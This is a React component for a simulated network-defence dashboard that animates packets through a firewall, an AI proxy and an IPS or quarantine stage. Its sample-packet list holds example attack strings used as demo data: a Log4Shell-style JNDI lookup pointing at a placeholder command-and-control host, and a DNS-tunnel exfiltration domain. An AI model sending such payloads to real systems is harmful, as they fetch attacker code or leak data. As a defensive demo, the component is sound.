import React, { useState, useEffect } from 'react';
import {
  Globe,
  Shield,
  Cpu,
  Layers,
  Lock,
  ArrowDown,
  ArrowRight,
  CheckCircle2,
  AlertTriangle,
  Play,
  Server,
  Zap,
  Activity,
  Sliders,
  Terminal,
  RefreshCw,
  Search,
} from 'lucide-react';
import { TopologyNode, LivePacket, ThreatSeverity } from '../types/cyber';
import { topologyNodes } from '../data/initialData';

interface TopologyViewProps {
  onInjectThreat?: (type: string) => void;
  isEngineActive: boolean;
}

export const TopologyView: React.FC<TopologyViewProps> = ({
  onInjectThreat,
  isEngineActive,
}) => {
  const [selectedNodeId, setSelectedNodeId] = useState<string>('AI_PROXY');
  const [activeTracePacket, setActiveTracePacket] = useState<LivePacket | null>(null);
  const [traceStep, setTraceStep] = useState<number>(0);
  const [traceLogs, setTraceLogs] = useState<string[]>([]);
  const [isTracing, setIsTracing] = useState<boolean>(false);

  // AI Proxy Configuration state
  const [heuristicThreshold, setHeuristicThreshold] = useState<number>(75);
  const [mlSensitivity, setMlSensitivity] = useState<'HIGH' | 'BALANCED' | 'STRICT'>('BALANCED');
  const [trafficShapingLimit, setTrafficShapingLimit] = useState<number>(500); // Mbps

  const selectedNode = topologyNodes.find((n) => n.id === selectedNodeId) || topologyNodes[2];

  // Pre-configured test packets for pipeline tracing
  const samplePackets = [
    {
      name: 'Legitimate HTTPS API Request',
      isThreat: false,
      attackVector: 'Clean REST Traffic',
      source: '142.250.190.46:443',
      dest: '10.0.1.25:443',
      payload: 'GET /api/v2/telemetry HTTP/2.0 Authorization: Bearer eyJhbGciOi...',
      heuristicScore: 12,
      mlZeroDayRisk: 3,
      branchResult: 'CLEAN_IPS',
    },
    {
      name: 'Layer 4 SYN Flood (Hardware Firewall target)',
      isThreat: true,
      attackVector: 'TCP SYN Flood',
      source: '198.51.100.22:443',
      dest: '10.0.1.45:443',
      payload: '[SYN Flag Set] Sequence=0 Win=1024 Rate=55,000 pps',
      heuristicScore: 94,
      mlZeroDayRisk: 15,
      branchResult: 'QUARANTINE',
    },
    {
      name: 'Polymorphic Zero-Day Exploit (AI Proxy DPI target)',
      isThreat: true,
      attackVector: 'Zero-Day Bytecode Injection',
      source: '45.154.255.88:8080',
      dest: '10.0.1.80:8080',
      payload: '${jndi:ldap://c2.zero-day-vector.net/payload} [Polymorphic Shellcode]',
      heuristicScore: 98,
      mlZeroDayRisk: 96,
      branchResult: 'QUARANTINE',
    },
    {
      name: 'Base64 Encoded DNS Tunnel Exfiltration',
      isThreat: true,
      attackVector: 'DNS Tunneling C2',
      source: '192.168.10.155:53',
      dest: '8.8.8.8:53',
      payload: 'aW5mb3NlYy1leGZpbHRyYXRpb24tcGF5bG9hZC0wMDE.c2-beacon.ns1.darkvector.cc',
      heuristicScore: 91,
      mlZeroDayRisk: 78,
      branchResult: 'QUARANTINE',
    },
  ];

  const [selectedSampleIndex, setSelectedSampleIndex] = useState<number>(2);

  const startPacketTrace = (sample = samplePackets[selectedSampleIndex]) => {
    setIsTracing(true);
    setTraceStep(1);
    setTraceLogs([`[WAN Ingress] Packet received from ${sample.source} -> ${sample.dest}`]);

    const packet: LivePacket = {
      id: `PKT-${Date.now().toString().slice(-4)}`,
      currentStep: 'WAN',
      source: sample.source,
      dest: sample.dest,
      attackVector: sample.attackVector,
      payload: sample.payload,
      isThreat: sample.isThreat,
      heuristicScore: sample.heuristicScore,
      mlZeroDayRisk: sample.mlZeroDayRisk,
      trafficBandwidthMbps: sample.isThreat ? 120 : 45,
    };
    setActiveTracePacket(packet);

    // Step 2: Hardware Firewall
    setTimeout(() => {
      setTraceStep(2);
      setTraceLogs((prev) => [
        ...prev,
        `[Hardware Firewall L3/L4] Port & Static IP verified. Filtering Layer 3/4 passed to AI Proxy.`,
      ]);
    }, 1000);

    // Step 3: AI Intelligence Proxy (Deep Packet Inspection & Heuristic Scoring)
    setTimeout(() => {
      setTraceStep(3);
      setTraceLogs((prev) => [
        ...prev,
        `[AI Intelligence Proxy] Running DPI & Heuristic Scoring... Score: ${sample.heuristicScore}/100. ML Zero-Day Prediction: ${sample.mlZeroDayRisk}%. Dynamic Shaping Active.`,
      ]);
    }, 2200);

    // Step 4: Routing Split Decision
    setTimeout(() => {
      setTraceStep(4);
      if (sample.isThreat || sample.heuristicScore >= heuristicThreshold) {
        setTraceLogs((prev) => [
          ...prev,
          `[Routing Verdict: ANOMALI / SERANGAN] Diverted instantly to Automated Quarantine / Block Enclave! Target isolated.`,
        ]);
        if (onInjectThreat) onInjectThreat(sample.attackVector);
      } else {
        setTraceLogs((prev) => [
          ...prev,
          `[Routing Verdict: TRAFIK BERSIH] Normalized traffic forwarded to Modul IPS Cluster (NIPS/HIPS/WIPS/NBA) and enterprise assets.`,
        ]);
      }
      setIsTracing(false);
    }, 3600);
  };

  return (
    <div className="space-y-6">
      {/* Top Banner explaining the Topology Alignment */}
      <div className="bg-gradient-to-r from-cyan-950/60 via-slate-900 to-indigo-950/40 border border-cyan-500/30 rounded-xl p-4.5 flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span className="text-xs font-mono-code font-bold uppercase tracking-wider px-2 py-0.5 rounded bg-cyan-500/20 text-cyan-300 border border-cyan-500/40">
              TOPOLOGI APLIKASI SESUAI SPESIFIKASI TXT
            </span>
            <span className="text-xs text-slate-400 font-mono-code">• Real-time Pipeline Map</span>
          </div>
          <h2 className="text-base font-bold text-slate-100 flex items-center gap-2">
            AI Intelligence Proxy Architectural Flow
          </h2>
          <p className="text-xs text-slate-300 mt-1 max-w-3xl leading-relaxed">
            Menampilkan posisi baru <span className="text-cyan-400 font-semibold">AI Intelligence Proxy / Layer</span> yang
            melakukan Deep Packet Inspection (DPI), Heuristic Scoring, Prediksi Serangan Zero-Day, serta pembagian cerdas antara{' '}
            <span className="text-emerald-400 font-medium">Trafik Bersih/Dinormalisasi</span> menuju Modul IPS dan{' '}
            <span className="text-rose-400 font-medium">Anomali/Serangan</span> menuju Automated Quarantine/Block.
          </p>
        </div>

        {/* Trace action button */}
        <div className="flex items-center gap-2 shrink-0">
          <button
            onClick={() => startPacketTrace()}
            disabled={isTracing}
            className={`flex items-center gap-2 px-4 py-2.5 rounded-lg border text-xs font-mono-code font-semibold transition-all ${
              isTracing
                ? 'bg-cyan-950/40 border-cyan-500/50 text-cyan-400 cursor-wait'
                : 'bg-cyan-600 hover:bg-cyan-500 border-cyan-400 text-slate-950 shadow-[0_0_15px_rgba(6,182,212,0.4)]'
            }`}
          >
            {isTracing ? (
              <>
                <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                <span>Tracing Flow...</span>
              </>
            ) : (
              <>
                <Play className="w-3.5 h-3.5 fill-current" />
                <span>Inject & Trace Packet</span>
              </>
            )}
          </button>
        </div>
      </div>

      {/* Main Grid: Interactive Topology Diagram + Node/Trace Inspector */}
      <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
        {/* Left Col (8 cols): Visual Topology Canvas */}
        <div className="xl:col-span-8 bg-[#0b1220]/95 border border-slate-800/90 rounded-xl p-5 flex flex-col justify-between">
          <div className="flex items-center justify-between mb-4 pb-3 border-b border-slate-800/80">
            <div className="flex items-center gap-2">
              <Layers className="w-4 h-4 text-cyan-400" />
              <h3 className="text-sm font-semibold text-slate-100">Live Network Pipeline Topology</h3>
            </div>
            <div className="flex items-center gap-3 text-xs font-mono-code">
              <span className="text-emerald-400 flex items-center gap-1.5">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                Pipeline Active
              </span>
              <span className="text-slate-500">•</span>
              <span className="text-slate-400">Click any block to inspect</span>
            </div>
          </div>

          {/* Vertical Pipeline Flow matching topologi_aplikasi_eea8c7c4.txt */}
          <div className="flex flex-col items-center gap-3 py-2 max-w-2xl mx-auto w-full">
            {/* NODE 1: [ INTERNET / WAN ] */}
            <div
              onClick={() => setSelectedNodeId('WAN')}
              className={`w-full rounded-xl border p-4 transition-all duration-300 cursor-pointer ${
                selectedNodeId === 'WAN'
                  ? 'border-slate-400 ring-2 ring-slate-500/30 bg-slate-900/90 shadow-lg'
                  : 'border-slate-800 bg-[#0d1627] hover:border-slate-700'
              } ${traceStep === 1 ? 'ring-4 ring-cyan-400 border-cyan-400 shadow-[0_0_20px_rgba(6,182,212,0.4)]' : ''}`}
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="p-2 rounded-lg bg-slate-800 text-slate-300">
                    <Globe className="w-5 h-5" />
                  </div>
                  <div>
                    <div className="flex items-center gap-2">
                      <h4 className="font-mono-code font-bold text-slate-100 text-sm">
                        [ INTERNET / WAN ]
                      </h4>
                      <span className="text-[10px] font-mono-code px-2 py-0.5 rounded bg-slate-800 border border-slate-700 text-slate-400">
                        PUBLIC TRANSIT
                      </span>
                    </div>
                    <p className="text-xs text-slate-400 mt-0.5">
                      Raw ingress packets from public edge and peering transit
                    </p>
                  </div>
                </div>
                <div className="text-right font-mono-code text-xs">
                  <span className="text-slate-400 block text-[10px]">Ingress Vol</span>
                  <span className="text-cyan-400 font-semibold">45.2k pps</span>
                </div>
              </div>
            </div>

            {/* Connecting Pipe 1 */}
            <div className="flex flex-col items-center relative py-0.5">
              <div className="w-0.5 h-6 bg-gradient-to-b from-slate-600 to-cyan-500 relative">
                <div
                  className={`w-2 h-2 rounded-full bg-cyan-400 absolute left-1/2 -translate-x-1/2 transition-all duration-500 ${
                    traceStep >= 1 ? 'top-full scale-125 shadow-[0_0_8px_#06b6d4]' : 'top-0 opacity-40'
                  }`}
                />
              </div>
              <ArrowDown className="w-3.5 h-3.5 text-cyan-400 -mt-1" />
            </div>

            {/* NODE 2: [ Hardware Firewall ] */}
            <div
              onClick={() => setSelectedNodeId('FIREWALL')}
              className={`w-full rounded-xl border p-4 transition-all duration-300 cursor-pointer ${
                selectedNodeId === 'FIREWALL'
                  ? 'border-blue-400 ring-2 ring-blue-500/30 bg-blue-950/30 shadow-lg'
                  : 'border-slate-800 bg-[#0d1627] hover:border-slate-700'
              } ${traceStep === 2 ? 'ring-4 ring-cyan-400 border-cyan-400 shadow-[0_0_20px_rgba(6,182,212,0.4)]' : ''}`}
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="p-2 rounded-lg bg-blue-950/60 border border-blue-500/40 text-blue-400">
                    <Shield className="w-5 h-5" />
                  </div>
                  <div>
                    <div className="flex items-center gap-2">
                      <h4 className="font-mono-code font-bold text-slate-100 text-sm">
                        [ Hardware Firewall ]
                      </h4>
                      <span className="text-[10px] font-mono-code px-2 py-0.5 rounded bg-blue-950 border border-blue-500/40 text-blue-300">
                        LAYER 3/4 FILTER
                      </span>
                    </div>
                    <p className="text-xs text-slate-400 mt-0.5">
                      Filtering Layer 3/4: Blokir port & IP blacklist statis
                    </p>
                  </div>
                </div>
                <div className="text-right font-mono-code text-xs">
                  <span className="text-slate-400 block text-[10px]">L3/L4 Dropped</span>
                  <span className="text-rose-400 font-semibold">1,835 pkts</span>
                </div>
              </div>
            </div>

            {/* Connecting Pipe 2 */}
            <div className="flex flex-col items-center relative py-0.5">
              <div className="w-0.5 h-6 bg-gradient-to-b from-blue-500 to-cyan-400 relative">
                <div
                  className={`w-2 h-2 rounded-full bg-cyan-400 absolute left-1/2 -translate-x-1/2 transition-all duration-500 ${
                    traceStep >= 2 ? 'top-full scale-125 shadow-[0_0_8px_#06b6d4]' : 'top-0 opacity-40'
                  }`}
                />
              </div>
              <ArrowDown className="w-3.5 h-3.5 text-cyan-400 -mt-1" />
            </div>

            {/* NODE 3: AI INTELLIGENCE PROXY / LAYER (Posisi Baru) */}
            <div
              onClick={() => setSelectedNodeId('AI_PROXY')}
              className={`w-full rounded-xl border p-4.5 transition-all duration-300 cursor-pointer relative ${
                selectedNodeId === 'AI_PROXY'
                  ? 'border-cyan-400 ring-2 ring-cyan-500/40 bg-gradient-to-br from-cyan-950/70 via-slate-900 to-blue-950/50 shadow-[0_0_25px_rgba(6,182,212,0.25)]'
                  : 'border-cyan-500/40 bg-gradient-to-br from-cyan-950/40 to-slate-900 hover:border-cyan-400'
              } ${traceStep === 3 ? 'ring-4 ring-cyan-300 shadow-[0_0_30px_rgba(6,182,212,0.5)]' : ''}`}
            >
              {/* Highlight badge for new position */}
              <div className="absolute -top-3 right-4 bg-cyan-500 text-slate-950 font-mono-code font-bold text-[10px] px-2.5 py-0.5 rounded-full shadow-md flex items-center gap-1">
                <Zap className="w-3 h-3 fill-slate-950" />
                POSISI BARU: AI PROXY LAYER
              </div>

              <div className="flex items-center justify-between mb-3">
                <div className="flex items-center gap-3">
                  <div className="p-2.5 rounded-xl bg-cyan-500/20 border border-cyan-400/50 text-cyan-300 shadow-[0_0_12px_rgba(6,182,212,0.3)]">
                    <Cpu className="w-6 h-6" />
                  </div>
                  <div>
                    <h4 className="font-mono-code font-bold text-cyan-300 text-base">
                      AI INTELLIGENCE PROXY / LAYER
                    </h4>
                    <p className="text-xs text-slate-300 mt-0.5">
                      Intelligent DPI, Heuristic Engine & Zero-Day Prediction Gateway
                    </p>
                  </div>
                </div>

                <div className="text-right font-mono-code text-xs">
                  <span className="text-cyan-400/80 block text-[10px]">DPI Inspected</span>
                  <span className="text-cyan-300 font-bold text-sm">148,290</span>
                </div>
              </div>

              {/* Sub features listed in txt file */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-2 text-xs font-mono-code pt-2 border-t border-cyan-900/60">
                <div className="bg-cyan-950/50 border border-cyan-800/40 rounded-lg p-2 text-slate-300">
                  <span className="text-cyan-400 font-semibold block text-[11px] mb-0.5">1. DPI & Heuristics</span>
                  Payload inspection & score (0-100)
                </div>
                <div className="bg-cyan-950/50 border border-cyan-800/40 rounded-lg p-2 text-slate-300">
                  <span className="text-cyan-400 font-semibold block text-[11px] mb-0.5">2. Zero-Day Prediction</span>
                  ML inference on unindexed bytecode
                </div>
                <div className="bg-cyan-950/50 border border-cyan-800/40 rounded-lg p-2 text-slate-300">
                  <span className="text-cyan-400 font-semibold block text-[11px] mb-0.5">3. Dynamic Shaping</span>
                  Smart clean vs anomaly routing
                </div>
              </div>
            </div>

            {/* Split Flow branching arrows */}
            <div className="w-full relative py-2">
              <svg viewBox="0 0 600 60" className="w-full h-12 overflow-visible">
                {/* Clean traffic branch left */}
                <path
                  d="M 300 0 L 300 20 L 150 20 L 150 50"
                  fill="none"
                  stroke={traceStep === 4 && (!activeTracePacket || !activeTracePacket.isThreat) ? '#10b981' : '#059669'}
                  strokeWidth="2.5"
                  strokeDasharray="4 4"
                  className="animate-pulse"
                />
                {/* Anomaly / Attack branch right */}
                <path
                  d="M 300 0 L 300 20 L 450 20 L 450 50"
                  fill="none"
                  stroke={traceStep === 4 && activeTracePacket?.isThreat ? '#f43f5e' : '#e11d48'}
                  strokeWidth="2.5"
                  strokeDasharray="4 4"
                  className="animate-pulse"
                />

                {/* Branch labels */}
                <text x="140" y="32" fill="#10b981" fontSize="10" fontFamily="JetBrains Mono, monospace" textAnchor="end">
                  ▼ Trafik Bersih / Dinormalisasi
                </text>
                <text x="460" y="32" fill="#f43f5e" fontSize="10" fontFamily="JetBrains Mono, monospace" textAnchor="start">
                  ▼ Anomali / Serangan
                </text>
              </svg>
            </div>

            {/* TWO BOTTOM BRANCH TARGETS: IPS Cluster VS Automated Quarantine */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 w-full">
              {/* Branch Left: [ Modul IPS: NIPS, HIPS, dll ] */}
              <div
                onClick={() => setSelectedNodeId('IPS_CLUSTER')}
                className={`rounded-xl border p-4 transition-all duration-300 cursor-pointer ${
                  selectedNodeId === 'IPS_CLUSTER'
                    ? 'border-emerald-400 ring-2 ring-emerald-500/30 bg-emerald-950/20 shadow-lg'
                    : 'border-emerald-500/30 bg-[#0d1627] hover:border-emerald-500/60'
                } ${
                  traceStep === 4 && (!activeTracePacket || !activeTracePacket.isThreat)
                    ? 'ring-4 ring-emerald-400 border-emerald-400 shadow-[0_0_20px_rgba(16,185,129,0.4)]'
                    : ''
                }`}
              >
                <div className="flex items-center gap-3 mb-2">
                  <div className="p-2 rounded-lg bg-emerald-950/60 border border-emerald-500/40 text-emerald-400">
                    <CheckCircle2 className="w-5 h-5" />
                  </div>
                  <div>
                    <h5 className="font-mono-code font-bold text-emerald-300 text-sm">
                      [ Modul IPS: NIPS, HIPS, WIPS, NBA ]
                    </h5>
                    <span className="text-[10px] font-mono-code text-emerald-400/80">
                      Trafik Bersih / Dinormalisasi
                    </span>
                  </div>
                </div>
                <p className="text-xs text-slate-400 mb-3 leading-relaxed">
                  Traffic cleared by AI Proxy is piped to inline IPS engines and destination enterprise servers.
                </p>
                <div className="flex items-center justify-between text-[11px] font-mono-code text-slate-300 pt-2 border-t border-slate-800">
                  <span className="text-slate-400">Clean Rate:</span>
                  <span className="text-emerald-400 font-semibold">485.6 Mbps</span>
                </div>
              </div>

              {/* Branch Right: [ Automated Quarantine / Block ] */}
              <div
                onClick={() => setSelectedNodeId('QUARANTINE')}
                className={`rounded-xl border p-4 transition-all duration-300 cursor-pointer ${
                  selectedNodeId === 'QUARANTINE'
                    ? 'border-rose-400 ring-2 ring-rose-500/30 bg-rose-950/20 shadow-lg'
                    : 'border-rose-500/30 bg-[#0d1627] hover:border-rose-500/60'
                } ${
                  traceStep === 4 && activeTracePacket?.isThreat
                    ? 'ring-4 ring-rose-400 border-rose-400 shadow-[0_0_20px_rgba(244,63,94,0.4)]'
                    : ''
                }`}
              >
                <div className="flex items-center gap-3 mb-2">
                  <div className="p-2 rounded-lg bg-rose-950/60 border border-rose-500/40 text-rose-400">
                    <Lock className="w-5 h-5" />
                  </div>
                  <div>
                    <h5 className="font-mono-code font-bold text-rose-300 text-sm">
                      [ Automated Quarantine / Block ]
                    </h5>
                    <span className="text-[10px] font-mono-code text-rose-400/80">
                      Anomali / Serangan Terisolasi
                    </span>
                  </div>
                </div>
                <p className="text-xs text-slate-400 mb-3 leading-relaxed">
                  High-risk and zero-day anomalies diverted immediately into automated host/PID isolation sandbox.
                </p>
                <div className="flex items-center justify-between text-[11px] font-mono-code text-slate-300 pt-2 border-t border-slate-800">
                  <span className="text-slate-400">Quarantine Enclave:</span>
                  <span className="text-rose-400 font-semibold">18 Hosts Active</span>
                </div>
              </div>
            </div>
          </div>

          {/* Trace Event Log Console */}
          <div className="mt-4 pt-3 border-t border-slate-800">
            <div className="flex items-center justify-between mb-1.5 text-xs font-mono-code">
              <span className="text-slate-400 flex items-center gap-1.5">
                <Terminal className="w-3.5 h-3.5 text-cyan-400" />
                Live Pipeline Execution Log:
              </span>
              <span className="text-[10px] text-slate-500">Step {traceStep}/4</span>
            </div>
            <div className="bg-slate-950/80 border border-slate-800/80 rounded-lg p-2.5 font-mono-code text-xs space-y-1 max-h-24 overflow-y-auto">
              {traceLogs.length === 0 ? (
                <div className="text-slate-500 italic">
                  Press "Inject & Trace Packet" above or choose a sample test vector to visualize flow.
                </div>
              ) : (
                traceLogs.map((log, i) => (
                  <div key={i} className="text-slate-300 flex items-start gap-2">
                    <span className="text-cyan-400 select-none">&gt;</span>
                    <span>{log}</span>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>

        {/* Right Col (4 cols): Node Inspector & Interactive Controls */}
        <div className="xl:col-span-4 space-y-4">
          {/* Node Inspector Card */}
          <div className="bg-[#0b1220]/95 border border-slate-800/90 rounded-xl p-4">
            <div className="flex items-center justify-between mb-3 pb-2 border-b border-slate-800">
              <div className="flex items-center gap-2">
                <Server className="w-4 h-4 text-cyan-400" />
                <h3 className="text-sm font-semibold text-slate-100">Node Inspector</h3>
              </div>
              <span className="text-[10px] font-mono-code font-bold px-2 py-0.5 rounded bg-slate-800 border border-slate-700 text-cyan-400">
                {selectedNode.badge || selectedNode.type}
              </span>
            </div>

            <div>
              <h4 className="text-base font-bold font-mono-code text-slate-100 mb-1">
                {selectedNode.name}
              </h4>
              <p className="text-xs text-slate-400 mb-3">{selectedNode.description}</p>

              <div className="space-y-2 mb-4">
                <div className="text-xs font-semibold text-slate-300 font-mono-code">Core Responsibilities:</div>
                <div className="space-y-1.5">
                  {selectedNode.subItems.map((item, idx) => (
                    <div key={idx} className="flex items-start gap-2 text-xs text-slate-300 bg-slate-900/60 p-2 rounded border border-slate-800">
                      <CheckCircle2 className="w-3.5 h-3.5 text-cyan-400 shrink-0 mt-0.5" />
                      <span>{item}</span>
                    </div>
                  ))}
                </div>
              </div>

              <div className="grid grid-cols-2 gap-2 text-xs font-mono-code pt-3 border-t border-slate-800">
                <div className="bg-slate-900/80 p-2 rounded">
                  <span className="text-slate-500 block text-[10px]">Packets Handled</span>
                  <span className="text-slate-200 font-semibold">
                    {selectedNode.packetsHandled.toLocaleString()}
                  </span>
                </div>
                <div className="bg-slate-900/80 p-2 rounded">
                  <span className="text-slate-500 block text-[10px]">Threats Detected</span>
                  <span className="text-rose-400 font-semibold">
                    {selectedNode.threatsDetected.toLocaleString()}
                  </span>
                </div>
              </div>
            </div>
          </div>

          {/* AI Proxy Parameter Controls */}
          <div className="bg-[#0b1220]/95 border border-cyan-500/30 rounded-xl p-4">
            <div className="flex items-center justify-between mb-3 pb-2 border-b border-slate-800">
              <div className="flex items-center gap-2">
                <Sliders className="w-4 h-4 text-cyan-400" />
                <h3 className="text-sm font-semibold text-slate-100">AI Proxy Tuning</h3>
              </div>
              <span className="text-[10px] font-mono-code text-emerald-400">Online</span>
            </div>

            <div className="space-y-3.5 text-xs font-mono-code">
              {/* Heuristic Threshold */}
              <div>
                <div className="flex justify-between text-slate-300 mb-1">
                  <span>Heuristic Quarantine Threshold:</span>
                  <span className="text-cyan-400 font-bold">{heuristicThreshold}/100</span>
                </div>
                <input
                  type="range"
                  min="40"
                  max="95"
                  value={heuristicThreshold}
                  onChange={(e) => setHeuristicThreshold(Number(e.target.value))}
                  className="w-full accent-cyan-400 bg-slate-800 rounded h-1.5 cursor-pointer"
                />
                <div className="flex justify-between text-[10px] text-slate-500 mt-0.5">
                  <span>Lenient (40)</span>
                  <span>Strict (95)</span>
                </div>
              </div>

              {/* Zero-Day ML Model Mode */}
              <div>
                <div className="text-slate-300 mb-1.5">Zero-Day Prediction Sensitivity:</div>
                <div className="grid grid-cols-3 gap-1.5">
                  {(['HIGH', 'BALANCED', 'STRICT'] as const).map((mode) => (
                    <button
                      key={mode}
                      onClick={() => setMlSensitivity(mode)}
                      className={`py-1 rounded text-center text-[10px] border transition-colors ${
                        mlSensitivity === mode
                          ? 'bg-cyan-950 border-cyan-400 text-cyan-300 font-bold'
                          : 'bg-slate-900 border-slate-800 text-slate-400 hover:border-slate-700'
                      }`}
                    >
                      {mode}
                    </button>
                  ))}
                </div>
              </div>

              {/* Traffic Shaping Limiter */}
              <div>
                <div className="flex justify-between text-slate-300 mb-1">
                  <span>Dynamic Shaping Throttle:</span>
                  <span className="text-slate-200 font-bold">{trafficShapingLimit} Mbps</span>
                </div>
                <input
                  type="range"
                  min="100"
                  max="1000"
                  step="50"
                  value={trafficShapingLimit}
                  onChange={(e) => setTrafficShapingLimit(Number(e.target.value))}
                  className="w-full accent-cyan-400 bg-slate-800 rounded h-1.5 cursor-pointer"
                />
              </div>
            </div>
          </div>

          {/* Packet Injector Selector */}
          <div className="bg-[#0b1220]/95 border border-slate-800/90 rounded-xl p-4">
            <div className="flex items-center gap-2 mb-2">
              <Zap className="w-4 h-4 text-amber-400" />
              <h3 className="text-sm font-semibold text-slate-100">Select Test Packet Vector</h3>
            </div>
            <div className="space-y-1.5">
              {samplePackets.map((pkt, idx) => (
                <div
                  key={idx}
                  onClick={() => {
                    setSelectedSampleIndex(idx);
                    startPacketTrace(pkt);
                  }}
                  className={`p-2.5 rounded-lg border text-xs cursor-pointer transition-colors ${
                    selectedSampleIndex === idx
                      ? 'border-cyan-500/60 bg-cyan-950/40 text-cyan-200'
                      : 'border-slate-800 bg-slate-900/60 text-slate-300 hover:border-slate-700'
                  }`}
                >
                  <div className="flex items-center justify-between font-mono-code mb-0.5">
                    <span className="font-semibold">{pkt.name}</span>
                    <span
                      className={`text-[10px] px-1.5 py-0.2 rounded ${
                        pkt.isThreat ? 'text-rose-400 bg-rose-950/60' : 'text-emerald-400 bg-emerald-950/60'
                      }`}
                    >
                      {pkt.isThreat ? 'ANOMALY' : 'CLEAN'}
                    </span>
                  </div>
                  <div className="text-[10px] text-slate-500 font-mono-code truncate">
                    {pkt.payload}
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
